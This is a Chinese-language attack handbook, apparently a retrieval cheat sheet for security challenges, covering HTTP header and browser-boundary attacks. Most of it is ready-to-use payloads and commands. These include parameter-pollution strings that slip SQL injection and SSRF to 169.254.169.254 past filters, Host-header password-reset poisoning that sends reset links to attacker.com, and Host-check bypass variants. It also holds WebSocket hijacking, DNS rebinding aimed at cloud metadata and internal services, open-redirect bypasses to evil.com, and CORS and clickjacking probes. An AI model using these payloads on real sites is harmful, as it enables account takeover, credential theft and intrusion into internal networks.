# HTTP 头与浏览器边界攻击手册

适用题型（命中即召回本手册）：HTTP Host 头 参数污染 HPP 密码重置 投毒 缓存 WebSocket CSWSH 未授权 Origin 校验 DNS rebinding 开放重定向 open-redirect 点击劫持 clickjacking CORS 跨域 凭证

## 1. 识别与分类
- 同一参数名重复出现 / 中间层与后端解析不一致 → HPP（参数污染）；
- 邮件/回调/密码重置链接用服务端拼域名、SEO 重定向 → Host 头攻击；
- 响应 101 Switching Protocols / Upgrade: websocket → WebSocket（无 Origin 校验→CSWSH）；
- 响应带 Access-Control-Allow-Origin、`?url=/redirect=/next=` 参数、可被 iframe 嵌入 → CORS/开放重定向/点击劫持。

## 2. 攻击方法论
1. HPP：重复参数制造"校验层 vs 执行层"解析差
```text
id=1&id=2   (PHP/Django取最后, Tomcat/Go取第一, Express成数组, ASP.NET逗号拼接)
WAF读第一值、应用读最后值:  id=safe&id=1%20UNION%20SELECT...
SSRF:  url=https://allowed.example/&url=http://169.254.169.254/
```
2. Host 头密码重置投毒：改 Host 使重置链接指向攻击域
```http
POST /forgot-password HTTP/1.1
Host: attacker.com          （email=victim@target）
```
3. Host 校验绕过（按顺序试）
```text
X-Forwarded-Host: attacker.com   X-Host: attacker.com   Forwarded: host=attacker.com
GET http://attacker.com/ HTTP/1.1 （绝对URI覆盖Host）  双Host头
Host: target.com:@attacker.com   Host: target.com.   Host: target.com%09attacker.com
```
4. Host 缓存投毒 + vhost 枚举
```text
缓存key不含Host但响应体用Host → 投毒；ffuf -u http://IP -H "Host: FUZZ.target.com" -w vhosts.txt
特殊值: localhost 127.0.0.1 admin internal staging intranet
```
5. WebSocket CSWSH：改 Origin 看是否仍 101；无校验则受害者浏览器开双向信道读写
```javascript
new WebSocket('wss://target.com/ws')  // 页面在攻击域加载，cookie自动带上
```
6. WebSocket 未授权/注入：token 在 URL、ws:// 明文、消息体注入（SQLi/命令/XSS）、Socket.IO 命名空间越权。
7. DNS rebinding：TTL=0 双解析绕过同源访问内网
```text
首次解析→攻击IP(下发JS)，二次解析→内网IP；SOP 只比 hostname 字符串不比 IP
目标: 169.254.169.254 云元数据 / Docker 2375 / K8s 6443 / Redis 6379
```
8. 开放重定向：找参数名 + 绕过过滤器
```text
参数: url redirect next dest returnUrl go continue callback rurl
绕过: //evil.com  https://trusted.com@evil.com  /\evil.com  https://trusted.com/%2f%2fevil.com  http://evil.com?trusted.com
```
9. 点击劫持：无 X-Frame-Options / CSP frame-ancestors 的敏感页（删除/改邮箱/转账）用透明 iframe 覆盖；JS frame-busting 用 sandbox（无 allow-top-navigation）绕过。
10. CORS 误配置：反射 Origin + credentials 读带凭证响应
```text
探测: curl -H "Origin: https://evil.com" -H "Cookie: SID=..." https://T/api -i 看是否回显 Access-Control-Allow-Origin
绕过: null(沙箱iframe)  https://attacker.com/.target.com  https://target.com.attacker.com  后缀/子串正则漏洞
```

## 3. 变体与绕过
- Host 头被严格校验时重点试 X-Forwarded-Host（#1 漏检点）与绝对 URI、双 Host、keep-alive 连接态第二请求。
- HPP 无回显/无差异时交换顺序（a=1&a=2 与 a=2&a=1），并在 JSON 里测重复键（JSON.parse 取最后）。
- 开放重定向过滤器：双编码（%252e）、Unicode 点（%E3%80%82）、tab/换行、CRLF 注入 Location 头。
- DNS rebinding 浏览器缓存（Chrome~60s）用多子域名/多 A 记录失败回退绕过；目标校验 Host 头时 rebinding 失效，改走 SSRF。
- CORS 反射但缓存缺 Vary: Origin → 缓存投毒把攻击者 Origin 钉进缓存。
- WebSocket 无 Origin 校验但要求子协议/首条消息认证时，按握手要求补齐再测 CSWSH。

## 战法要点
- HPP 先判两端取值规则（first/last/join/array）再设计分裂，别盲发。
- Host 投毒只在"服务端用 Host 拼 URL"的场景有效，先确认重置链接里是否回显域名。
- 双 Host / 绝对 URI / X-Forwarded-Host 是绕过 Host 校验的三板斧。
- CSWSH 前提：Origin 未校验 + 会话 cookie 是 SameSite=None 或旧版无属性。
- DNS rebinding 打的是"受害者浏览器能到、服务端到不了"的内网；服务端到不了才选它，否则用 SSRF。
- 开放重定向单独危害低，重点找链：OAuth token 窃取、SSRF 跟随重定向、CSRF Referer 绕过。
- CORS 只有"反射 Origin + Allow-Credentials:true"才真正可读带凭证数据；纯 * 不算可利用读。

## 速查清单
```text
# HPP
id=1&id=2   ?id[]=1&id[]=2   {"a":"1","a":"2"}
# Host 绕过
X-Forwarded-Host / X-Host / Forwarded: host= / 双Host / 绝对URI / @ / 尾点 / tab
# WebSocket
Origin: https://attacker.com → 看101；wss://host/ws?token= 泄漏
# DNS rebinding
7f000001.c0a80101.rbndr.us  (TTL=0 双解析)
# 开放重定向
//evil.com  https://trusted.com@evil.com  /\evil.com  %2f%2fevil.com  %252ecom
# 点击劫持
curl -sI https://T/ | grep -i "x-frame-options\|content-security-policy"  → 无则 iframe 覆盖
# CORS
curl -H "Origin: https://evil.com" -i https://T/api  → 回显ACAO+credentials=true 则可读
```
